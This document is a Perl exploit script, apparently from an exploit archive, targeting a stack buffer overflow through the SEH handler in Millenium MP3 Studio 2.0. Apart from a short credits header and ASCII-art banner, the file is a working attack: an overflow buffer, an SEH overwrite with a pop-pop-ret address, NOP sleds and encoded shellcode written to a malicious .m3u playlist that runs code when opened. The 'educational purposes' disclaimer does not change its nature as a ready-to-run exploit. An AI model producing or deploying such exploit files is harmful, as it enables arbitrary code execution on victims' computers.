# [+] Vulnerability	: .m3u File Local Stack Overflow Universal Exploit (SEH) 
# [+] Product		: Millenium MP3 Studio
# [+] Versions affected : v2.0
# [+] Download          : http://www.software112.com/products/mp3-millennium+download.html
# [+] Method		: seh
# [+] Tested on         : Windows XP SP2 En, Windows XP SP3 En, Windows Vista SP1 Swe
# [+] Written by        : dellnull  (dellnull[at]gmail[dot]com
# [+] Greetz to         : corelanc0d3r
# [+] Based on http://www.packetstormsecurity.org/0910-exploits/millennium_mp3_studio_2.0.pl.txt (Almost the same ;-)
# [+] Just run the script and open the created file (universal.m3u) with Mp3-Millennium 2.0
# [+] Enjoy the NOP slide ;-)

# -----------------------------------------------------------------------------
#                                               MMMMM~.
#                                               MMMMM?.
#    MMMMMM8.  .=MMMMMMM.. MMMMMMMM, MMMMMMM8.  MMMMM?. MMMMMMM:   MMMMMMMMMM.
#  MMMMMMMMMM=.MMMMMMMMMMM.MMMMMMMM=MMMMMMMMMM=.MMMMM?7MMMMMMMMMM: MMMMMMMMMMM:
#  MMMMMIMMMMM+MMMMM$MMMMM=MMMMMD$I8MMMMMIMMMMM~MMMMM?MMMMMZMMMMMI.MMMMMZMMMMM:
#  MMMMM==7III~MMMMM=MMMMM=MMMMM$. 8MMMMMZ$$$$$~MMMMM?..MMMMMMMMMI.MMMMM+MMMMM:
#  MMMMM=.     MMMMM=MMMMM=MMMMM7. 8MMMMM?    . MMMMM?NMMMM8MMMMMI.MMMMM+MMMMM:
#  MMMMM=MMMMM+MMMMM=MMMMM=MMMMM7. 8MMMMM?MMMMM:MMMMM?MMMMMIMMMMMO.MMMMM+MMMMM:
#  =MMMMMMMMMZ~MMMMMMMMMM8~MMMMM7. .MMMMMMMMMMO:MMMMM?MMMMMMMMMMMMIMMMMM+MMMMM:
#  .:$MMMMMO7:..+OMMMMMO$=.MMMMM7.  ,IMMMMMMO$~ MMMMM?.?MMMOZMMMMZ~MMMMM+MMMMM:
#     .,,,..      .,,,,.   .,,,,,     ..,,,..   .,,,,.. .,,...,,,. .,,,,..,,,,.
#                                                                   eip hunters
# -----------------------------------------------------------------------------
#
# Script provided for educational purposes only.
#
#
#

my $sploitfile ="universal.m3u";
my $junk = "http://";
$junk=$junk."A" x 4103;
my $nseh ="\xeb\x1d\x90\x90";
my $seh =pack('V', 0x10012D15);
my $nops ="\x90" x 25;
my $shellcode ="\x89\xe6\xda\xdb\xd9\x76\xf4\x58\x50\x59\x49\x49\x49\x49" .
"\x43\x43\x43\x43\x43\x43\x51\x5a\x56\x54\x58\x33\x30\x56" .
"\x58\x34\x41\x50\x30\x41\x33\x48\x48\x30\x41\x30\x30\x41" .
"\x42\x41\x41\x42\x54\x41\x41\x51\x32\x41\x42\x32\x42\x42" .
"\x30\x42\x42\x58\x50\x38\x41\x43\x4a\x4a\x49\x4b\x4c\x4b" .
"\x58\x50\x44\x45\x50\x43\x30\x43\x30\x4c\x4b\x51\x55\x47" .
"\x4c\x4c\x4b\x43\x4c\x45\x55\x43\x48\x45\x51\x4a\x4f\x4c" .
"\x4b\x50\x4f\x45\x48\x4c\x4b\x51\x4f\x47\x50\x45\x51\x4a" .
"\x4b\x51\x59\x4c\x4b\x50\x34\x4c\x4b\x45\x51\x4a\x4e\x50" .
"\x31\x49\x50\x4d\x49\x4e\x4c\x4c\x44\x49\x50\x42\x54\x43" .
"\x37\x49\x51\x49\x5a\x44\x4d\x43\x31\x48\x42\x4a\x4b\x4b" .
"\x44\x47\x4b\x51\x44\x47\x54\x45\x54\x42\x55\x4b\x55\x4c" .
"\x4b\x51\x4f\x46\x44\x43\x31\x4a\x4b\x42\x46\x4c\x4b\x44" .
"\x4c\x50\x4b\x4c\x4b\x51\x4f\x45\x4c\x43\x31\x4a\x4b\x4c" .
"\x4b\x45\x4c\x4c\x4b\x45\x51\x4a\x4b\x4d\x59\x51\x4c\x51" .
"\x34\x45\x54\x48\x43\x51\x4f\x50\x31\x4a\x56\x43\x50\x51" .
"\x46\x45\x34\x4c\x4b\x47\x36\x46\x50\x4c\x4b\x47\x30\x44" .
"\x4c\x4c\x4b\x44\x30\x45\x4c\x4e\x4d\x4c\x4b\x43\x58\x45" .
"\x58\x4b\x39\x4b\x48\x4b\x33\x49\x50\x43\x5a\x46\x30\x42" .
"\x48\x4a\x50\x4c\x4a\x44\x44\x51\x4f\x42\x48\x4a\x38\x4b" .
"\x4e\x4d\x5a\x44\x4e\x51\x47\x4b\x4f\x4a\x47\x42\x43\x45" .
"\x31\x42\x4c\x45\x33\x45\x50\x41\x41";
my $nops2 ="\x90" x 100;
my $payload = $junk.$nseh.$seh.$nops.$shellcode.$nops2;
print " [+] Writing exploit to file : $sploitfile\n";
open (myfile, ">$sploitfile");
print myfile $payload;
close (myfile);
print " [+] File ".$sploitfile." created\n";
print " [+] " .length($payload)." bytes\n";